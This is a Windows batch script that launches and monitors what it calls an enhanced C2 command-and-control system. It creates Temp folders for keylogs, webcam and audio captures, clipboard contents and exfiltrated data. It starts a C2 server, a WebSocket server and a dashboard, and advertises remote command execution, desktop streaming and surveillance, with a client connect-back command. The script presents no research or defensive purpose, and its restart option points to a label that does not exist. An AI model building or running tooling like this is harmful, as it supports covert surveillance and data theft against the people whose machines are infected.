@echo off
echo ================================================================
echo            C2 ENHANCED SYSTEM STARTUP
echo ================================================================
echo.
echo Starting enhanced C2 command and control system...
echo.

REM Create necessary directories
echo [*] Creating directories...
mkdir "C:\Windows\Temp\C2_Bots" 2>nul
mkdir "C:\Windows\Temp\C2_Screenshots" 2>nul
mkdir "C:\Windows\Temp\C2_Keylogs" 2>nul
mkdir "C:\Windows\Temp\C2_CommandQueue" 2>nul
mkdir "C:\Windows\Temp\C2_Uploads" 2>nul
mkdir "C:\Windows\Temp\C2_Downloads" 2>nul
mkdir "C:\Windows\Temp\C2_Streams" 2>nul
mkdir "C:\Windows\Temp\C2_Webcam" 2>nul
mkdir "C:\Windows\Temp\C2_Audio" 2>nul
mkdir "C:\Windows\Temp\C2_Exfiltrated" 2>nul
mkdir "C:\Windows\Temp\C2_Clipboard" 2>nul

REM Check if Python is available
echo [*] Checking Python installation...
python --version >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Python is not installed or not in PATH
    echo Please install Python 3.x and add it to PATH
    pause
    exit /b 1
)

REM Check if required Python packages are installed
echo [*] Checking Python dependencies...
python -c "import websockets, asyncio" >nul 2>&1
if errorlevel 1 (
    echo [*] Installing required Python packages...
    pip install websockets asyncio
    if errorlevel 1 (
        echo [ERROR] Failed to install Python packages
        pause
        exit /b 1
    )
)

REM Start the C2 server
echo [*] Starting C2 server...
start "C2 Server" cmd /c "escapebox.exe server && pause"
timeout /t 3 /nobreak >nul

REM Start the enhanced WebSocket server
echo [*] Starting enhanced WebSocket server...
start "Enhanced WebSocket Server" cmd /c "python c2_enhanced_websocket_server.py && pause"
timeout /t 2 /nobreak >nul

REM Open the enhanced dashboard
echo [*] Opening enhanced dashboard...
timeout /t 3 /nobreak >nul
start "" "http://localhost:8080/c2_dashboard_enhanced_analytics.html"

echo.
echo ================================================================
echo            ENHANCED C2 SYSTEM STARTED
echo ================================================================
echo.
echo Web Dashboard: http://localhost:8080/c2_dashboard_enhanced_analytics.html
echo WebSocket Server: ws://localhost:8081
echo C2 Server: Running on port 443/8443
echo.
echo Features Available:
echo  - Multi-client command execution with targeting
echo  - Real-time desktop streaming
echo  - Bidirectional file transfer
echo  - Comprehensive analytics dashboard
echo  - Advanced surveillance capabilities
echo.
echo To connect clients, use:
echo   escapebox.exe client [server_ip] [port]
echo.
echo Press any key to view system status...
pause >nul

REM Show system status
:status_loop
cls
echo ================================================================
echo            C2 ENHANCED SYSTEM STATUS
echo ================================================================
echo.

REM Check if processes are running
tasklist /FI "IMAGENAME eq escapebox.exe" 2>nul | find /I "escapebox.exe" >nul
if errorlevel 1 (
    echo [ERROR] C2 Server is not running
    set SERVER_STATUS=OFFLINE
) else (
    echo [OK] C2 Server is running
    set SERVER_STATUS=ONLINE
)

tasklist /FI "IMAGENAME eq python.exe" 2>nul | find /I "python.exe" >nul
if errorlevel 1 (
    echo [ERROR] WebSocket Server is not running
    set WEBSOCKET_STATUS=OFFLINE
) else (
    echo [OK] WebSocket Server is running  
    set WEBSOCKET_STATUS=ONLINE
)

REM Check if web server is responding
powershell -Command "(Invoke-WebRequest -Uri 'http://localhost:8080/ws-info' -TimeoutSec 2).StatusCode" >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Web Dashboard is not responding
    set WEB_STATUS=OFFLINE
) else (
    echo [OK] Web Dashboard is accessible
    set WEB_STATUS=ONLINE
)

echo.
echo Active Connections:
REM Check for client connections
if exist "C:\Windows\Temp\C2_Bots\*.json" (
    echo [*] Connected clients found:
    for %%f in ("C:\Windows\Temp\C2_Bots\*.json") do (
        echo     - %%~nf
    )
) else (
    echo [*] No clients connected
)

echo.
echo Recent Activity:
if exist "C:\Windows\Temp\c2_activity.log" (
    echo [*] Last 5 activities:
    powershell -Command "Get-Content 'C:\Windows\Temp\c2_activity.log' -Tail 5" 2>nul
) else (
    echo [*] No activity logged yet
)

echo.
echo ================================================================
echo Commands:
echo   R - Restart system
echo   S - Stop system
echo   D - Open dashboard
echo   L - View logs
echo   Q - Quit monitor
echo ================================================================
echo.

choice /C RSDLQ /N /M "Select option: "
if errorlevel 5 goto :end
if errorlevel 4 goto :show_logs
if errorlevel 3 goto :open_dashboard
if errorlevel 2 goto :stop_system
if errorlevel 1 goto :restart_system

:restart_system
echo [*] Restarting system...
call :stop_system
timeout /t 2 /nobreak >nul
goto :start

:stop_system
echo [*] Stopping C2 Enhanced System...
taskkill /F /IM escapebox.exe >nul 2>&1
taskkill /F /IM python.exe >nul 2>&1
echo [*] System stopped
pause
goto :end

:open_dashboard
echo [*] Opening dashboard...
start "" "http://localhost:8080/c2_dashboard_enhanced_analytics.html"
goto :status_loop

:show_logs
echo [*] Showing recent logs...
if exist "C:\Windows\Temp\c2_activity.log" (
    type "C:\Windows\Temp\c2_activity.log"
) else (
    echo No logs available
)
if exist "C:\temp\c2_server_detailed.log" (
    echo.
    echo === Server Logs ===
    type "C:\temp\c2_server_detailed.log"
)
pause
goto :status_loop

:end
echo.
echo Enhanced C2 System monitoring ended.
pause